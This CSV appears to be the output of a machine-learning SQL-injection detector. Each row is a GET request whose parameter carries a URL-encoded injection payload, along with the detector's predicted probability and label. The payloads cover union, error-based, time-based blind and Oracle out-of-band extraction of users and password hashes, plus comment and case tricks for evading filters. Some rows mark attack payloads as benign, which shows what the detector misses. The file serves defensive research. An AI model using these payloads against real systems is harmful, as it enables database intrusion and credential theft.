Method,length,content,URL,Predicted_Probability,Predicted_Label
GET,0,,/?p=15%20and%20%271%27%3D%28SELECT%20%271%27%20FROM%20dual%29%20and%20%270having%27%3D%270having%27,1.0,1
GET,0,,/?p=%5B%221807192982%27%29%29%20union%20se%22%2C%22lect%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C0%2C11%23%22%5D,0.999997,1
GET,0,,/?p=%5B%221807192982%27%29%29%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C0%2C11%23%22%5D,0.99999595,1
GET,0,,/?p=%5B%221807192982%27%29%29%20union/%2A%2A/select/%2A%2A/1%2C/%2A%2A/2%2C/%2A%2A/3%2C/%2A%2A/4%2C/%2A%2A/5%2C/%2A%2A/6%2C/%2A%2A/7%2C/%2A%2A/8%2C/%2A%2A/9%2C/%2A%2A/%E2%80%99pentestit%E2%80%99%2C/%2A%2A/11%23%22%5D,0.9999958,1
GET,0,,/?p=-1945%2B/%2A%21%55NiOn%2A/%20/%2A%21%53eLEct%2A/%2B1%2C2%2C3%2C%27soy%20vulnerable%27%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2B--%2B,0.9999995,1
GET,0,,/?p=1%A0and%A01%3D1%A0--,0.9548628,1
GET,0,,/?p=%281%29and%281%29%3D%281%29--,0.024541048,0
GET,0,,/?p=1%20and%20%281%2C2%2C3%2C4%29%20%3D%20%28SELECT%20%2A%20from%20db.users%20UNION%20SELECT%201%2C2%2C3%2C4%20LIMIT%201%29,0.99989533,1
GET,0,,/?p=1%20and%20ascii%28lower%28substring%28%28select%20top%201%20name%20from%20sysobjects%20where%20xtype%3D%27u%27%29%2C%201%2C%201%29%29%29%20%3E%20116,0.9999573,1
GET,0,,/?p=1%20and%20ascii%28lower%28substr%28Version%28%29%2C1%2C1%29%29%29%3D51,0.99283916,1
GET,0,,/?p=1%20AND%20extractvalue%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2Ccolumn_name%2CCHAR%28126%29%29%20FROM%20information_schema.columns%20WHERE%20TABLE_NAME%3Ddata_table%20LIMIT%20data_offset%2C1%29%29%29--,1.0,1
GET,0,,/?p=1%20AND%20extractvalue%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2Cdata_info%2CCHAR%28126%29%29%20FROM%20data_table.data_column%20LIMIT%20data_offset%2C1%29%29%29--,1.0,1
GET,0,,/?p=1%20AND%20extractvalue%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2Cschema_name%2CCHAR%28126%29%29%20FROM%20information_schema.schemata%20LIMIT%20data_offset%2C1%29%29%29--,0.9999999,1
GET,0,,/?p=1%20AND%20extractvalue%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2CTABLE_NAME%2CCHAR%28126%29%29%20FROM%20information_schema.TABLES%20WHERE%20table_schema%3Ddata_column%20LIMIT%20data_offset%2C1%29%29%29--,1.0,1
GET,0,,/?p=1%20AND%20extractvalue%28rand%28%29%2Cconcat%28CHAR%28126%29%2Cversion%28%29%2CCHAR%28126%29%29%29--,0.9948449,1
GET,0,,/?p=1%20AND%20if%28%28ascii%28lower%28substring%28%28select%20user%28%29%29%2C%24i%2C1%29%29%29%29%21%3D%24s%2C1%2Cbenchmark%28200000%2Cmd5%28now%28%29%29%29%29,0.9999987,1
GET,0,,/?p=1%20AND%20IF%28ASCII%28SUBSTRING%28%28SELECT%20USER%28%29%29%2C1%2C1%29%29%29%3E%3D100%2C1%2C%20BENCHMARK%282000000%2CMD5%28NOW%28%29%29%29%29%20--,1.0,1
GET,0,,/?p=1%20AND%20IF%28ASCII%28SUBSTRING%28%28SELECT%20USER%28%29%29%2C%201%2C%201%29%29%29%3E%3D100%2C%201%2C%20SLEEP%283%29%29%20--,1.0,1
GET,0,,/?p=1%20and%20left%28version%28%29%2C1%29%3D4,0.080704406,0
GET,0,,/?p=1%20and%20right%28left%28version%28%29%2C1%29%2C1%29%3D5,0.31752762,0
GET,0,,/?p=1%20AND%20%28select%20DCount%28last%28username%29%26after%3D1%26after%3D1%29%20from%20users%20where%20username%3D%27ad1min%27%29,0.94758993,1
GET,0,,/?p=%281%29and%28SELECT%20%2A%20from%20db.users%29%3D%281%29,0.9973151,1
GET,0,,/?p=1%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%20NAME_CONST%28database%28%29%2C1%29%2CNAME_CONST%28database%28%29%2C1%29%29%20as%20x%29--,0.999992,1
GET,0,,/?p=1%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%20NAME_CONST%28user%28%29%2C1%29%2CNAME_CONST%28user%28%29%2C1%29%29%20as%20x%29--,0.99996877,1
GET,0,,/?p=1%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%20NAME_CONST%28version%28%29%2C1%29%2CNAME_CONST%28version%28%29%2C1%29%29%20as%20x%29--,0.99992394,1
GET,0,,/?p=1%20AND%20%28SELECT%20%2A%20FROM%20Users%29%20%3D%201%20,0.9999163,1
GET,0,,/?p=1%20and%20%28select%20mid%28version%28%29%2C1%2C1%29%3D4%29,0.8858904,1
GET,0,,/?p=1%20and%20%28select%20sleep%2810%29%20from%20dual%20where%20database%28%29%20like%20%27%%27%29%23,1.0,1
GET,0,,/?p=1%20and%20%28select%20sleep%2810%29%20from%20dual%20where%20database%28%29%20like%20%27a____%27%29%23,1.0,1
GET,0,,/?p=1%20and%20%28select%20sleep%2810%29%20from%20dual%20where%20%28select%20table_name%20from%20information_schema.columns%20where%20table_schema%3Ddatabase%28%29%20and%20column_name%20like%20%27%pass%%27%20limit%200%2C1%29%20like%20%27%%27%29%23,1.0,1
GET,0,,/?p=1%20AND%20SELECT%20SUBSTR%28column_name%2C1%2C1%29%20FROM%20information_schema.columns%20%3E%20%27A%27,1.0,1
GET,0,,/?p=1%20AND%20SELECT%20SUBSTR%28table_name%2C1%2C1%29%20FROM%20information_schema.tables%20%3E%20%27A%27,1.0,1
GET,0,,/?p=1%20and%20substring%28version%28%29%2C1%2C1%29%3D5,0.959433,1
GET,0,,/?p=1/%2Acomment%2A/and/%2A%2A/1%3D1/%2A%2A/--,0.99997556,1
GET,0,,/?p=1%27%20GROUP%20BY%201%2C2%2C3--%2B,0.9999999,1
GET,0,,/?p=1%20%7C%7C%20lpad%28user%2C7%2C1%29,0.2808044,0
GET,0,,/?p=1%20or%20benchmark%2810000000%2CMD5%281%29%29%23,0.99997675,1
GET,0,,/?p=1%29%20or%20benchmark%2810000000%2CMD5%281%29%29%23,0.9999244,1
GET,0,,/?p=1%29%29%20or%20benchmark%2810000000%2CMD5%281%29%29%23,0.99993455,1
GET,0,,/?p=1%27%20ORDER%20BY%201%2C2%2C3--%2B,1.0,1
GET,0,,/?p=1%27%20ORDER%20BY%202--%2B,0.99999976,1
GET,0,,/?p=1%20or%20pg_sleep%285%29--,0.972399,1
GET,0,,/?p=1%29%20or%20pg_sleep%285%29--,0.45567724,0
GET,0,,/?p=1%29%29%20or%20pg_sleep%285%29--,0.9425862,1
GET,0,,/?p=1%20or%20sleep%285%29%23,0.9848053,1
GET,0,,/?p=1%29%20or%20sleep%285%29%23,0.90194994,1
GET,0,,/?p=1%29%29%20or%20sleep%285%29%23,0.9823391,1
GET,0,,/?p=1%3B%28select%201%20from%20pg_sleep%285%29%29,0.35411873,0
GET,0,,/?p=1%7C%7C%28select%201%20from%20pg_sleep%285%29%29,0.12838987,0
GET,0,,/?p=1%27UNION/%2A%210SELECT%20user%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9/%2A%210from/%2A%210mysql.user/%2A-,1.0,1
GET,0,,/?p=1%20uNIoN%28sEleCT%2B1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29,0.853208,1
GET,0,,/?p=1%20union%20all%20select%201%2C2%2C3%2C4%2C5%2C6%2Cname%20from%20sysobjects%20where%20xtype%20%3D%20%27u%27%20--,0.99987495,1
GET,0,,/?p=1%20union%20select%201%2C2%2C3,0.0036464026,0
GET,0,,/?p=1%2Bun/%2A%2A/ion%2Bsel/%2A%2A/ect%2B1%2C2%2C3--,0.9997906,1
GET,0,,/?p=1%2Bunion%2Bselect%2B1%2C2%2C3--,0.99144745,1
GET,0,,/?p=.1union/%2A%2A_%2A%2A/select/%2A%21.1%2A/%2C2%2C3--%2B,1.0,1
GET,0,,/?p=-1%27%20UNION%20SELECT%201%2C2%2C3--%2B,1.0,1
GET,0,,/?p=1%20uNIoN%28sEleCT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29,0.80191857,1
GET,0,,/?p=%281%29union%28%28%28%28%28%28%28select%281%29%2Chex%28hash%29from%28users%29%29%29%29%29%29%29%29%20/%281%29or%280x50%3D0x50%29,0.99989593,1
GET,0,,/?p=-1%20UNION%20SELECT%201%20INTO%20%40%2C%40,0.9983878,1
GET,0,,/?p=%281%29union%28select%281%29%2Cmid%28hash%2C1%2C32%29from%28users%29%29%20/1%2Bunion%2B%28select%271%27%2Cconcat%28login%2Chash%29from%2Busers,0.9984744,1
GET,0,,/?p=1%20union%20select%20username%2Cpassword%2C3%2C4%20from%20users,0.7371299,1
GET,0,,/?p=1%20%7C%7C%20user_id%20is%20not%20null,0.057882067,0
GET,0,,/?p=2100935%27%20OR%20IF%28MID%28%40%40version%2C1%2C1%29%3D%274%27%2Csleep%281%29%2C1%29%3D%272,1.0,1
GET,0,,/?p=2100935%27%20OR%20IF%28MID%28%40%40version%2C1%2C1%29%3D%275%27%2Csleep%281%29%2C1%29%3D%272,1.0,1
GET,0,,/?p=%23%3Fzen%3F%0Aunion%20all%23zen%0A%23Zen%0Aselect,0.9999858,1
GET,0,,/?p=%2c%28select%20%2A%20from%20%28select%28sleep%2810%29%29%29a%29,0.99962544,1
GET,0,,/?p=a%22and/%2Ag%2A/456%3D678--%20%23,1.0,1
GET,0,,/?p=a%27and/%2Ag%2A/456%3D678--%20%23,1.0,1
GET,0,,/?p=admin%22%20%23,0.9999093,1
GET,0,,/?p=admin%22%20--,0.9998852,1
GET,0,,/?p=admin%22/%2A,0.9999708,1
GET,0,,/?p=admin%27%29%20or%20%271%27%3D%271%27%23,0.9999999,1
GET,0,,/?p=admin%27or%201%3D1%20or%20%27%27%3D%27,1.0,1
GET,0,,/?p=%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,0.9999014,1
GET,0,,/?p=%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,0.99999726,1
GET,0,,/?p=%22%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,0.99998975,1
GET,0,,/?p=%22%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,0.99999964,1
GET,0,,/?p=%22%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,0.99990094,1
GET,0,,/?p=%22%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,0.99999654,1
GET,0,,/?p=%22%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,0.99985635,1
GET,0,,/?p=%22%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,0.9999931,1
GET,0,,/?p=%22%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,0.9998734,1
GET,0,,/?p=%22%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,0.99999297,1
GET,0,,/?p=%22%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,0.99988186,1
GET,0,,/?p=%22%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,0.99999475,1
GET,0,,/?p=%27%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,0.99999845,1
GET,0,,/?p=%27%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,0.9999999,1
GET,0,,/?p=%27%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,0.9999924,1
GET,0,,/?p=%27%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,0.99999964,1
GET,0,,/?p=%27%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,0.99996614,1
GET,0,,/?p=%27%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,0.99999845,1
GET,0,,/?p=%27%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,0.99996936,1
GET,0,,/?p=%27%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,0.99999845,1
GET,0,,/?p=%27%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,0.9999796,1
GET,0,,/?p=%27%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,0.99999905,1
GET,0,,/?p=%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,0.9994367,1
GET,0,,/?p=%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,0.9999809,1
GET,0,,/?p=%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,0.99905163,1
GET,0,,/?p=%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,0.99996114,1
GET,0,,/?p=%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,0.9991335,1
GET,0,,/?p=%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,0.999964,1
GET,0,,/?p=%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,0.9991978,1
GET,0,,/?p=%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,0.9999746,1
GET,0,,/?p=%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,0.9999386,1
GET,0,,/?p=%22%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,0.99999416,1
GET,0,,/?p=%22%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,0.9999436,1
GET,0,,/?p=%22%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,0.9999144,1
GET,0,,/?p=%22%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,0.99991536,1
GET,0,,/?p=%22%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,0.99993086,1
GET,0,,/?p=%27%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,0.9999989,1
GET,0,,/?p=%27%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,0.99999547,1
GET,0,,/?p=%27%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,0.99997675,1
GET,0,,/?p=%27%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,0.9999776,1
GET,0,,/?p=%27%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,0.99998677,1
GET,0,,/?p=%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,0.9996723,1
GET,0,,/?p=%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,0.9994455,1
GET,0,,/?p=%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,0.99943715,1
GET,0,,/?p=%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,0.9995468,1
GET,0,,/?p=%20AND%201%3D0,0.96789396,1
GET,0,,/?p=%20AND%201%3D0%23,0.99871624,1
GET,0,,/?p=%20AND%201%3D0--%20,0.9999981,1
GET,0,,/?p=%20AND%201083%3D1083%20AND%20%281427%3D1427,0.9999988,1
GET,0,,/?p=%20AND%201%3D0%20AND%20%27%%27%3D%27,1.0,1
GET,0,,/?p=%20AND%201%3D1,0.81035304,1
GET,0,,/?p=%20AND%201%3D1%23,0.99001604,1
GET,0,,/?p=%20AND%201%3D1--%20,0.9999765,1
GET,0,,/?p=%20AND%201%3D1%20AND%20%27%%27%3D%27,1.0,1
GET,0,,/?p=%27%20and%201%3Dcast%28%28SELECT%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name%3D%27data_table%27%20LIMIT%201%20OFFSET%20data_offset%29%20as%20int%29%20and%20%271%27%3D%271,1.0,1
GET,0,,/?p=%27%20and%201%3Dcast%28%28SELECT%20concat%28%27DATABASE%3A%20%27%2Ccurrent_database%28%29%29%29%20as%20int%29%20and%20%271%27%3D%271,1.0,1
GET,0,,/?p=%27%20and%201%3Dcast%28%28SELECT%20data_column%20FROM%20data_table%20LIMIT%201%20OFFSET%20data_offset%29%20as%20int%29%20and%20%271%27%3D%271,1.0,1
GET,0,,/?p=%27%20and%201%3Dcast%28%28SELECT%20table_name%20FROM%20information_schema.tables%20LIMIT%201%20OFFSET%20data_offset%29%20as%20int%29%20and%20%271%27%3D%271,1.0,1
GET,0,,/?p=%27%20and%201%3D%28%20if%28%28load_file%28char%28110%2C46%2C101%2C120%2C116%29%29%3C%3Echar%2839%2C39%29%29%2C1%2C0%29%29%3B,1.0,1
GET,0,,/?p=%27%20and%201%20in%20%28select%20min%28name%29%20from%20sysobjects%20where%20xtype%20%3D%20%27U%27%20and%20name%20%3E%20%27.%27%29%20--,0.99999285,1
GET,0,,/?p=%27%20and%201%20in%20%28select%20var%20from%20temp%29--,0.99918157,1
GET,0,,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20banner%20FROM%20v%24version%20WHERE%20ROWNUM%3D1%29%29%20AND%20%27i%27%3D%27i,1.0,1
GET,0,,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20COUNT%28DISTINCT%28column_name%29%29%20FROM%20sys.all_tab_columns%29%29%20AND%20%27i%27%3D%27i,1.0,1
GET,0,,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20COUNT%28DISTINCT%28GRANTED_ROLE%29%29%20FROM%20DBA_ROLE_PRIVS%20WHERE%20GRANTEE%3DSYS.LOGIN_USER%29%29%20AND%20%27i%27%3D%27i,1.0,1
GET,0,,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20COUNT%28DISTINCT%28PASSWORD%29%29%20FROM%20SYS.USER%24%29%29%20AND%20%27i%27%3D%27i,1.0,1
GET,0,,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20COUNT%28DISTINCT%28table_name%29%29%20FROM%20sys.all_tables%29%29%20AND%20%27i%27%3D%27i,1.0,1
GET,0,,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20COUNT%28DISTINCT%28USERNAME%29%29%20FROM%20SYS.ALL_USERS%29%29%20AND%20%27i%27%3D%27i,1.0,1
GET,0,,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20DISTINCT%28column_name%29%20FROM%20%28SELECT%20DISTINCT%28column_name%29%2C%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns%29%20WHERE%20LIMIT%3D3%29%29%20AND%20%27i%27%3D%27i,1.0,1
GET,0,,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20DISTINCT%28granted_role%29%20FROM%20%28SELECT%20DISTINCT%28granted_role%29%2C%20ROWNUM%20AS%20LIMIT%20FROM%20dba_role_privs%20WHERE%20GRANTEE%3DSYS.LOGINUSER%29%20WHERE%20LIMIT%3D3%29%29%20AND%20%27i%27%3D%27i,1.0,1
GET,0,,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20DISTINCT%28PASSWORD%29%20FROM%20%28SELECT%20DISTINCT%28PASSWORD%29%2C%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER%24%29%20WHERE%20LIMIT%3D3%29%29%20AND%20%27i%27%3D%27i,1.0,1
GET,0,,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20DISTINCT%28table_name%29%20FROM%20%28SELECT%20DISTINCT%28table_name%29%2C%20ROWNUM%20AS%20LIMIT%20FROM%20sys.all_tables%29%20WHERE%20LIMIT%3D6%29%29%20AND%20%27i%27%3D%27i,1.0,1
GET,0,,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20DISTINCT%28USERNAME%29%20FROM%20%28SELECT%20DISTINCT%28USERNAME%29%2C%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS%29%20WHERE%20LIMIT%3D5%29%29%20AND%20%27i%27%3D%27i,1.0,1
GET,0,,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20global_name%20FROM%20global_name%29%29%20AND%20%27i%27%3D%27i,1.0,1
GET,0,,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20host_name%20FROM%20v%24instance%29%29%20AND%20%27i%27%3D%27i,1.0,1
GET,0,,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20SYS.DATABASE_NAME%20FROM%20DUAL%29%29%20AND%20%27i%27%3D%27i,1.0,1
GET,0,,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20SYS.LOGIN_USER%20FROM%20DUAL%29%29%20AND%20%27i%27%3D%27i,1.0,1
GET,0,,/?p=AND%202947%3DLIKE%28%27ABCDEFG%27%2CUPPER%28HEX%28RANDOMBLOB%281000000000/2%29%29%29%29,1.0,1
GET,0,,/?p=AND%202947%3DLIKE%28%27ABCDEFG%27%2CUPPER%28HEX%28RANDOMBLOB%28500000000/2%29%29%29%29,1.0,1
